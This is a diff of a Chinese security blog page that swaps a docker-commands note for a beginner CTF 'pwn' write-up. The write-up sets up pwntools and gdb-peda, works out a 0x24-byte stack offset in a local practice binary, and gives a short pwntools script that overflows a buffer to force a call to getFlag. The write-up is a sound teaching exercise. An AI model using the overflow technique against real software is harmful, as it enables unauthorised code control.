@@ -4,25 +4,34 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>docker 环境使用笔记 | GetFlag&#39;s Blog</title>
+    <title>pwn入门练习1 | GetFlag&#39;s Blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="GetFlag">
     
 
     
-    <meta name="description" content="寒假做了个兼职，给某安全公司平台写poc，用到docekr环境，之前没有接触过，一段时间学习后，发现了它的妙处，将自己用到的命令做个笔记，以备遗忘">
-<meta name="keywords" content="docker,笔记">
+    <meta name="description" content="web learn sleep &amp;amp; pwn learn start">
+<meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="docker 环境使用笔记">
-<meta property="og:url" content="http://flag0.com/2018/02/27/docker环境使用笔记/index.html">
+<meta property="og:title" content="pwn入门练习1">
+<meta property="og:url" content="http://flag0.com/2019/11/03/pwn入门练习1/index.html">
 <meta property="og:site_name" content="GetFlag&#39;s Blog">
-<meta property="og:description" content="寒假做了个兼职，给某安全公司平台写poc，用到docekr环境，之前没有接触过，一段时间学习后，发现了它的妙处，将自己用到的命令做个笔记，以备遗忘">
+<meta property="og:description" content="web learn sleep &amp;amp; pwn learn start">
 <meta property="og:locale" content="cn-zh">
-<meta property="og:updated_time" content="2018-03-22T07:00:25.866Z">
+<meta property="og:image" content="https://flag0.oss-cn-qingdao.aliyuncs.com/20191103072157.png">
+<meta property="og:image" content="https://flag0.oss-cn-qingdao.aliyuncs.com/20191103072332.png">
+<meta property="og:image" content="https://flag0.oss-cn-qingdao.aliyuncs.com/20191103072505.png">
+<meta property="og:image" content="https://flag0.oss-cn-qingdao.aliyuncs.com/20191103164600.png">
+<meta property="og:image" content="https://flag0.oss-cn-qingdao.aliyuncs.com/20191103165913.png">
+<meta property="og:image" content="https://flag0.oss-cn-qingdao.aliyuncs.com/20191103172016.png">
+<meta property="og:image" content="https://flag0.oss-cn-qingdao.aliyuncs.com/20191103173344.png">
+<meta property="og:image" content="https://flag0.oss-cn-qingdao.aliyuncs.com/20191103213403.png">
+<meta property="og:updated_time" content="2019-11-03T15:33:24.423Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="docker 环境使用笔记">
-<meta name="twitter:description" content="寒假做了个兼职，给某安全公司平台写poc，用到docekr环境，之前没有接触过，一段时间学习后，发现了它的妙处，将自己用到的命令做个笔记，以备遗忘">
+<meta name="twitter:title" content="pwn入门练习1">
+<meta name="twitter:description" content="web learn sleep &amp;amp; pwn learn start">
+<meta name="twitter:image" content="https://flag0.oss-cn-qingdao.aliyuncs.com/20191103072157.png">
 
     
     <link rel="alternative" href="/atom.xml" title="GetFlag&#39;s Blog" type="application/atom+xml">
@@ -78,14 +87,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2018/02/27/docker环境使用笔记/" title="docker 环境使用笔记" itemprop="url">docker 环境使用笔记</a>
+      <a href="/2019/11/03/pwn入门练习1/" title="pwn入门练习1" itemprop="url">pwn入门练习1</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="GetFlag" target="_blank" itemprop="author">GetFlag</a>
 		
   <p class="article-time">
-    <time datetime="2018-02-27T13:00:03.000Z" itemprop="datePublished"> Published 2018-02-27</time>
+    <time datetime="2019-11-03T15:57:55.000Z" itemprop="datePublished"> Published 2019-11-03</time>
     
   </p>
 </header>
@@ -94,78 +103,54 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">Contents</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#docekr安装"><span class="toc-number">1.</span> <span class="toc-text">docekr安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#导入镜像"><span class="toc-number">2.</span> <span class="toc-text">导入镜像</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#运行镜像"><span class="toc-number">3.</span> <span class="toc-text">运行镜像</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件交互"><span class="toc-number">4.</span> <span class="toc-text">文件交互</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关闭容器"><span class="toc-number">5.</span> <span class="toc-text">关闭容器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查看容器"><span class="toc-number">6.</span> <span class="toc-text">查看容器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查看镜像"><span class="toc-number">7.</span> <span class="toc-text">查看镜像</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#删除容器"><span class="toc-number">8.</span> <span class="toc-text">删除容器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#删除镜像"><span class="toc-number">9.</span> <span class="toc-text">删除镜像</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提交容器"><span class="toc-number">10.</span> <span class="toc-text">提交容器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#命令镜像"><span class="toc-number">11.</span> <span class="toc-text">命令镜像</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#进入运行容器"><span class="toc-number">12.</span> <span class="toc-text">进入运行容器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#登陆仓库"><span class="toc-number">13.</span> <span class="toc-text">登陆仓库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#下拉镜像"><span class="toc-number">14.</span> <span class="toc-text">下拉镜像</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#上传镜像"><span class="toc-number">15.</span> <span class="toc-text">上传镜像</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#构建镜像"><span class="toc-number">16.</span> <span class="toc-text">构建镜像</span></a></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#安装pwntools"><span class="toc-number">1.</span> <span class="toc-text">安装pwntools</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gdb-peda常见命令"><span class="toc-number">2.</span> <span class="toc-text">gdb-peda常见命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目练习1"><span class="toc-number">3.</span> <span class="toc-text">题目练习1</span></a></li></ol>
 		
 		</div>
 		
-		<p>寒假做了个兼职，给某安全公司平台写poc，用到docekr环境，之前没有接触过，一段时间学习后，发现了它的妙处，将自己用到的命令做个笔记，以备遗忘</p>
+		<p>web learn sleep &amp; pwn learn start</p>
 <a id="more"></a>
-<h2 id="docekr安装"><a href="#docekr安装" class="headerlink" title="docekr安装"></a>docekr安装</h2><p>ubuntu</p>
-<pre><code>$sudo apt-get update
-$sudo apt-get install docker
-</code></pre><p>使用以上命令即可搞定，但不一定是最新的docekr，不过对于我来说影响不大，可以正常使用。</p>
-<h2 id="导入镜像"><a href="#导入镜像" class="headerlink" title="导入镜像"></a>导入镜像</h2><p>将save命令保存的docekr镜像文件导入</p>
-<pre><code>$sudo docekr load --input docekr_images.tar
-或者
-$sudo docekr load &lt; docker_images.tar
-</code></pre><h2 id="运行镜像"><a href="#运行镜像" class="headerlink" title="运行镜像"></a>运行镜像</h2><p>1.后台运行镜像并映射80端口到宿主机的80端口(前面为宿主的端口，后面为虚拟机端口)</p>
-<pre><code>docekr run -d -p 80:80 docker_images:6.5 
-</code></pre><p>2.运行镜像进行交互命令行，在当前命令结束后，对应容器也会结束</p>
-<pre><code>docker run -it docker_images:6.5 /bin/bash
-</code></pre><h2 id="文件交互"><a href="#文件交互" class="headerlink" title="文件交互"></a>文件交互</h2><p>1.宿主机向容器中发送文件</p>
-<pre><code>docekr cp ~/text.txt 容器id:/var/www/html/
-</code></pre><p>2.容器向宿主机发送文件</p>
-<pre><code>docker cp 容器id:/var/www/html/test.txt  /tmp/
-</code></pre><h2 id="关闭容器"><a href="#关闭容器" class="headerlink" title="关闭容器"></a>关闭容器</h2><p>1.停止容器，保存容器状态，docker start开始后内部状态不变，类似于虚拟机中的暂停</p>
-<pre><code>docker stop 容器ID
-</code></pre><p>2.终结容器，直接杀死当前容器，docker start 开始后内部为全新状态</p>
-<pre><code>docker kali 容器ID
-</code></pre><h2 id="查看容器"><a href="#查看容器" class="headerlink" title="查看容器"></a>查看容器</h2><pre><code>docker ps 显示当前运行的容器
-docker ps -a 显示服务器内全部容器
-docker ps -aq 显示全部容器且只显示容器ID
-</code></pre><h2 id="查看镜像"><a href="#查看镜像" class="headerlink" title="查看镜像"></a>查看镜像</h2><pre><code>dcoekr images 显示本机docker镜像
-dcoekr images -a 显示本机全部镜像，包含中间镜像(多重构时常用)
-docekr images aq 显示全部镜像且只显示镜像ID
-</code></pre><h2 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h2><pre><code>docekr rm 容器ID 强制处于关闭状态的容器
-docekr rm -f 容器ID 强制删除容器
-dcoekr rm $(docker ps -aq)删除本机所有处于关闭状态的容器
-</code></pre><h2 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h2><pre><code>dcoekr rmi 镜像名[:标签]    删除未被用作构建容器的镜像
-docker rmi -f 镜像名[:标签] 强制删除镜像
-</code></pre><h2 id="提交容器"><a href="#提交容器" class="headerlink" title="提交容器"></a>提交容器</h2><pre><code>dcoekr commit [-a 作者信息] 容器ID 镜像名
-将容器保存为镜像
-</code></pre><h2 id="命令镜像"><a href="#命令镜像" class="headerlink" title="命令镜像"></a>命令镜像</h2><p>将一个镜像命名为另一个镜像名</p>
-<pre><code>docker tag 镜像名[:标签] 镜像名[:标签]
-</code></pre><h2 id="进入运行容器"><a href="#进入运行容器" class="headerlink" title="进入运行容器"></a>进入运行容器</h2><p>1.docker exec -it 容器ID 执行命令</p>
-<pre><code>docker exec -it 容器ID /bin/bash
-</code></pre><p>阻塞当前容器运行命令并执行/bin/bash 进入容器命令行<br>2.dcoekr attach 容器id<br>阻塞当前容器，守护进程并执行默认终端</p>
-<pre><code>通过dcoekr inspect 容器ID 在 Entrypoint项查看
-</code></pre><h2 id="登陆仓库"><a href="#登陆仓库" class="headerlink" title="登陆仓库"></a>登陆仓库</h2><p>登陆对应仓库，需要手动输入用户及密码</p>
-<pre><code>docker login 仓库地址
-</code></pre><p>指定用户名，密码登陆对应仓库</p>
-<pre><code>docker login -u 用户名 -p 密码 仓库地址
-</code></pre><h2 id="下拉镜像"><a href="#下拉镜像" class="headerlink" title="下拉镜像"></a>下拉镜像</h2><p>默认从dockerhub下载镜像</p>
-<pre><code>docker pull 镜像名
-</code></pre><h2 id="上传镜像"><a href="#上传镜像" class="headerlink" title="上传镜像"></a>上传镜像</h2><p>默认向Dockerhub上传镜像</p>
-<pre><code>docekr push 镜像名
-</code></pre><h2 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h2><p>最后一个参数文件路径使用 . 含义为在当前目录下使用名字为Dockerfile的文件进行镜像构建。</p>
-<pre><code>docker build -t 镜像名 [--no-cache=true] Dockerfile文件绝对路径
-例 docker build -t php:5.5-apache-mysql-no-cache=true
-</code></pre><p>Dockerfile书写详细说明：</p>
-<pre><code>https://docs.docker.com/engine/reference/builder/#predefined-args
-</code></pre>  
+<h2 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a>安装pwntools</h2><p>配置源<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit ~/.pip/pip.conf</span><br></pre></td></tr></table></figure></p>
+<p>将以下内容复制到文件中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = http://pypi.douban.com/simple</span><br><span class="line">[install]</span><br><span class="line">trusted-host=pypi.douban.com</span><br></pre></td></tr></table></figure></p>
+<p>报错解决方案</p>
+<pre><code>根据报错我们定位到文件：/usr/local/lib/python2.7/dist-packages/pwnlib/elf/elf.py
+使用编辑器，将文件中所有的ENUM_P_TYPE改为ENUM_P_TYPE_BASE，一般在54行和1749行。
+</code></pre><h2 id="gdb-peda常见命令"><a href="#gdb-peda常见命令" class="headerlink" title="gdb-peda常见命令"></a>gdb-peda常见命令</h2><ul>
+<li>file path 打开文件</li>
+<li>run &amp; r 运行</li>
+<li>step 步入执行</li>
+<li>next 步过执行</li>
+<li>disassemble+func 对制定的函数进行反汇编</li>
+<li>break *0x400100 在0x400100处下断点</li>
+<li>b mian 在mian函数处下断点</li>
+<li>stack 20 查看堆栈<h2 id="题目练习1"><a href="#题目练习1" class="headerlink" title="题目练习1"></a>题目练习1</h2>我们把程序拖入ida进行分析<br>main函数<br><img src="https://flag0.oss-cn-qingdao.aliyuncs.com/20191103072157.png" alt="20191103072157.png"><br>foo函数</li>
+</ul>
+<p><img src="https://flag0.oss-cn-qingdao.aliyuncs.com/20191103072332.png" alt="20191103072332.png"></p>
+<p>getFlag函数</p>
+<p><img src="https://flag0.oss-cn-qingdao.aliyuncs.com/20191103072505.png" alt="20191103072505.png"></p>
+<p>可以看到这里是进行了一个判断当a1 == 1633771873时，会调用getFlag函数，读取flag文件，但是main函数给foo传入的值却为305419896，也就是说正常运行程序，不可能使其符合条件，执行getFlag函数</p>
+<p>下一步动态调试<br>来查看foo函数的汇编代码<br><img src="https://flag0.oss-cn-qingdao.aliyuncs.com/20191103164600.png" alt="20191103164600.png"></p>
+<p>来测试从变量s到a1的距离，然后去覆盖掉a1<br>可以看到变量s的地址为<code>0x080485ab</code><br>我们在变量b的位置下断点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ break *0x080485ab</span><br></pre></td></tr></table></figure></p>
+<p>此时断下的时候，eax的值就是变量s的地址<br><img src="https://flag0.oss-cn-qingdao.aliyuncs.com/20191103165913.png" alt="20191103165913.png"><br>此时eax的值为<code>0xffffd0bc</code>,ebp的值为<code>0xffffd0d8</code><br>ebp-eax=1c</p>
+<p>接下来看一下栈里面的情况</p>
+<p><img src="https://flag0.oss-cn-qingdao.aliyuncs.com/20191103172016.png" alt="20191103172016.png"><br>可以看到a1在eip的下面，s与ebp相差0x1c<br>如果我们想覆盖掉a1中的内容，需要测算下s和a1的距离<br>即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x1C + 0x4(ebp) + 0x4(eip) = 0x24</span><br></pre></td></tr></table></figure></p>
+<p>转为10进制为36，我们测试下输入36个A和4个B后，a1地址的值会变成怎么样<br><img src="https://flag0.oss-cn-qingdao.aliyuncs.com/20191103173344.png" alt="20191103173344.png"><br>可以看到变量s1的地址的内容被覆盖成了BBBB，<br>根据if，我们只需要将BBBB改为0x61616161既可以使条件成立，执行getFlag函数，这里需要注意一点我们输入是字符串和数字不同，我们需要将数字转换成为字符串然后输入</p>
+<p>我们构造payload<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">pwn = process(<span class="string">'./pwn0'</span>)</span><br><span class="line"><span class="keyword">print</span> pwn.recvline()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'T'</span> * (<span class="number">0x1C</span>+<span class="number">0x04</span>+<span class="number">0x04</span>)</span><br><span class="line">payload += p32(<span class="number">0x61616161</span>)</span><br><span class="line"></span><br><span class="line">pwn.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> pwn.recvline()</span><br><span class="line"><span class="keyword">print</span> pwn.recvline()</span><br></pre></td></tr></table></figure></p>
+<p>成功执行getFlag函数</p>
+<p><img src="https://flag0.oss-cn-qingdao.aliyuncs.com/20191103213403.png" alt="20191103213403.png"></p>
+  
 	</div>
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/编程开发/">编程开发</a>
+  <a class="article-category-link" href="/categories/安全竞赛/">安全竞赛</a>
 </div>
 
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/docker/">docker</a><a href="/tags/笔记/">笔记</a>
+  <span></span> <a href="/tags/pwn/">pwn</a>
   </div>
 
 </div>
@@ -174,7 +159,7 @@ docker rmi -f 镜像名[:标签] 强制删除镜像
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://flag0.com/2018/02/27/docker环境使用笔记/" data-title="docker 环境使用笔记 | GetFlag&#39;s Blog" data-tsina="" class="share clearfix">
+	  <div data-url="http://flag0.com/2019/11/03/pwn入门练习1/" data-title="pwn入门练习1 | GetFlag&#39;s Blog" data-tsina="" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -187,19 +172,11 @@ docker rmi -f 镜像名[:标签] 强制删除镜像
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/2018/02/27/AXMPP安装问题解决/" title="XAMPP Apache shutdown unexpectedly问题解决">
-  <strong>上一篇：</strong><br/>
-  <span>
-  XAMPP Apache shutdown unexpectedly问题解决</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/2018/02/18/AWD攻击脚本/"  title="AWD攻击脚本(持续更新)">
+<a href="/2019/10/31/ciscn2019-华北赛区-Day1-Dropbox/"  title="ciscn2019 华北赛区 Day1 Dropbox">
  <strong>下一篇：</strong><br/> 
- <span>AWD攻击脚本(持续更新)
+ <span>ciscn2019 华北赛区 Day1 Dropbox
 </span>
 </a>
 </div>
@@ -216,7 +193,7 @@ docker rmi -f 镜像名[:标签] 强制删除镜像
   <div id="toc" class="toc-aside">
   <strong class="toc-title">Contents</strong>
  
- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#docekr安装"><span class="toc-number">1.</span> <span class="toc-text">docekr安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#导入镜像"><span class="toc-number">2.</span> <span class="toc-text">导入镜像</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#运行镜像"><span class="toc-number">3.</span> <span class="toc-text">运行镜像</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件交互"><span class="toc-number">4.</span> <span class="toc-text">文件交互</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关闭容器"><span class="toc-number">5.</span> <span class="toc-text">关闭容器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查看容器"><span class="toc-number">6.</span> <span class="toc-text">查看容器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查看镜像"><span class="toc-number">7.</span> <span class="toc-text">查看镜像</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#删除容器"><span class="toc-number">8.</span> <span class="toc-text">删除容器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#删除镜像"><span class="toc-number">9.</span> <span class="toc-text">删除镜像</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提交容器"><span class="toc-number">10.</span> <span class="toc-text">提交容器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#命令镜像"><span class="toc-number">11.</span> <span class="toc-text">命令镜像</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#进入运行容器"><span class="toc-number">12.</span> <span class="toc-text">进入运行容器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#登陆仓库"><span class="toc-number">13.</span> <span class="toc-text">登陆仓库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#下拉镜像"><span class="toc-number">14.</span> <span class="toc-text">下拉镜像</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#上传镜像"><span class="toc-number">15.</span> <span class="toc-text">上传镜像</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#构建镜像"><span class="toc-number">16.</span> <span class="toc-text">构建镜像</span></a></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#安装pwntools"><span class="toc-number">1.</span> <span class="toc-text">安装pwntools</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gdb-peda常见命令"><span class="toc-number">2.</span> <span class="toc-text">gdb-peda常见命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目练习1"><span class="toc-number">3.</span> <span class="toc-text">题目练习1</span></a></li></ol>
  
   </div>
 
